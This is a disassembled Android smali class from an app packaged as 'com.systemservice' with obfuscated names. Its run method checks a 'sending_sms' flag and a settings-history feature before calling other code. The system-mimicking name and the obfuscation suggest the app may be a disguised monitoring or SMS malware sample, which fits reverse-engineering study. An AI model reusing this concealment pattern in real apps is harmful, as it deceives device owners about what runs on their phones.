.class Lcom/systemservice/a/c/h/d;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/b/a;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/systemservice/a/h/k;

.field final synthetic c:Lcom/systemservice/a/c/h/g;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/h/g;Landroid/content/Context;Lcom/systemservice/a/h/k;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/h/d;->c:Lcom/systemservice/a/c/h/g;

    iput-object p2, p0, Lcom/systemservice/a/c/h/d;->a:Landroid/content/Context;

    iput-object p3, p0, Lcom/systemservice/a/c/h/d;->b:Lcom/systemservice/a/h/k;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    iget-object v0, p0, Lcom/systemservice/a/c/h/d;->a:Landroid/content/Context;

    const-string v1, "sending_sms"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lcom/systemservice/a/c/h/d;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/systemservice/a/c/h/d;->c:Lcom/systemservice/a/c/h/g;

    iget-object v1, p0, Lcom/systemservice/a/c/h/d;->a:Landroid/content/Context;

    iget-object v2, p0, Lcom/systemservice/a/c/h/d;->b:Lcom/systemservice/a/h/k;

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/c/h/g;->a(Lcom/systemservice/a/c/h/g;Landroid/content/Context;Lcom/systemservice/a/h/k;)V

    goto :goto_0

    :cond_0
    const/4 v0, 0x1

    sput-boolean v0, Lcom/systemservice/a/a/j;->c:Z

    :cond_1
    :goto_0
    return-void
.end method
